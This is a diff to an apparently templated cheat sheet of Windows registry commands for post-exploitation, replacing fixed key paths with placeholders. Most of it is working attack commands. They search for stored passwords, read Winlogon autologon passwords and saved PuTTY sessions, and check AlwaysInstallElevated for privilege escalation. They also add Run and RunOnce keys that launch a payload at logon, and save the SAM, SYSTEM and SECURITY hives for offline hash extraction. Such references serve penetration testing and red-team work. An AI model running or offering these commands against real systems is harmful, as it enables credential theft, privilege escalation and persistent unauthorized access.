@@ -40,7 +40,7 @@ reg query {{KEYPATH:str:HKLM\SOFTWARE\Microsoft}} /s
 Read all values of a key via PowerShell (Registry:: provider path).
 
 ```bash
-Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty -Path Registry::{{KEYPATH:str:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,powershell,run -->
@@ -62,7 +62,7 @@ Get-ItemProperty -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVer
 List just the value NAMES under a key (no data).
 
 ```bash
-Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
+Get-Item -Path Registry::{{KEYPATH:str:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}} | Select-Object -ExpandProperty Property
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,powershell,names -->
@@ -73,7 +73,7 @@ Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVe
 Walk a key and all of its subkeys recursively.
 
 ```bash
-Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
+Get-ChildItem -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion}} -Recurse
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,powershell,recursive -->
@@ -106,7 +106,7 @@ reg query {{HIVE:str:HKLM}} /f "{{PATTERN:str:password}}" /t REG_SZ /s
 Search for a pattern in KEY names only (/k), recursively.
 
 ```bash
-reg query HKCU /f "{{PATTERN:str:Password}}" /t REG_SZ /s /k
+reg query {{HIVE:str:HKCU}} /f "{{PATTERN:str:Password}}" /t REG_SZ /s /k
 ```
 
 <!-- meta: risk=low | phase=post | tags=registry,reg,search -->
@@ -117,7 +117,7 @@ reg query HKCU /f "{{PATTERN:str:Password}}" /t REG_SZ /s /k
 Read Winlogon DefaultUserName / DefaultPassword — cleartext autologon creds when set.
 
 ```bash
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "{{KEYPATH:str:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon}}" /v {{VALUE:str:DefaultPassword}}
 ```
 
 <!-- meta: risk=low | phase=post | tags=registry,creds,autologon -->
@@ -128,7 +128,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Defaul
 Enumerate saved PuTTY sessions (hostnames, usernames, proxy creds).
 
 ```bash
-reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
+reg query {{KEYPATH:str:HKCU\Software\SimonTatham\PuTTY\Sessions}} /s
 ```
 
 <!-- meta: risk=low | phase=post | tags=registry,creds,putty -->
@@ -139,7 +139,7 @@ reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
 Both keys = 1 means any user can install MSIs as SYSTEM (privesc).
 
 ```bash
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query {{KEYPATH:str:HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer}} /v {{VALUE:str:AlwaysInstallElevated}}; reg query {{KEYPATH_HKCU:str:HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer}} /v {{VALUE:str:AlwaysInstallElevated}}
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,privesc,alwaysinstallelevated -->
@@ -150,7 +150,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 Enumerate installed programs from the Uninstall keys.
 
 ```bash
-Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | ForEach-Object { Get-ItemProperty $_.PSPath } | Select-Object DisplayName, DisplayVersion
+Get-ChildItem -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall}} | ForEach-Object { Get-ItemProperty $_.PSPath } | Select-Object DisplayName, DisplayVersion
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,software,enum -->
@@ -216,7 +216,7 @@ Set-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\MyKey}} -Name {{VALUE:str:ac
 Drop a Run value so a payload launches at every user logon.
 
 ```bash
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v {{VALUE:str:Updater}} /t REG_SZ /d "{{DATA:str:C:\Windows\Temp\payload.exe}}" /f
+reg add "{{KEYPATH:str:HKCU\Software\Microsoft\Windows\CurrentVersion\Run}}" /v {{VALUE:str:Updater}} /t REG_SZ /d "{{DATA:str:C:\Windows\Temp\payload.exe}}" /f
 ```
 
 <!-- meta: risk=high | phase=post | tags=registry,persistence,run -->
@@ -227,7 +227,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v {{VALUE:str:Upda
 RunOnce value — payload runs once at the next logon, then is removed.
 
 ```bash
-New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce -Name {{VALUE:str:access}} -PropertyType String -Value "{{DATA:str:C:\Windows\Temp\payload.exe}}" -Force
+New-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce}} -Name {{VALUE:str:access}} -PropertyType String -Value "{{DATA:str:C:\Windows\Temp\payload.exe}}" -Force
 ```
 
 <!-- meta: risk=high | phase=post | tags=registry,persistence,runonce -->
@@ -238,7 +238,7 @@ New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce -
 Show every Run-key autorun across HKLM + HKCU at once.
 
 ```bash
-Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}, {{KEYPATH_HKCU:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}
 ```
 
 <!-- meta: risk=low | phase=enum | tags=registry,persistence,autoruns -->
@@ -304,7 +304,7 @@ reg export {{KEYPATH:str:HKLM\SOFTWARE\Microsoft}} {{OUTFILE:file:out.reg}}
 Dump the SAM + SYSTEM hives for offline credential extraction (needs SYSTEM).
 
 ```bash
-reg save HKLM\SAM C:\Windows\Temp\sam.save; reg save HKLM\SYSTEM C:\Windows\Temp\system.save; reg save HKLM\SECURITY C:\Windows\Temp\security.save
+reg save HKLM\SAM {{OUTFILE:file:C:\Windows\Temp\sam.save}}; reg save HKLM\SYSTEM {{OUTFILE_SYSTEM:file:C:\Windows\Temp\system.save}}; reg save HKLM\SECURITY {{OUTFILE_SECURITY:file:C:\Windows\Temp\security.save}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=registry,creds,sam,hashdump -->
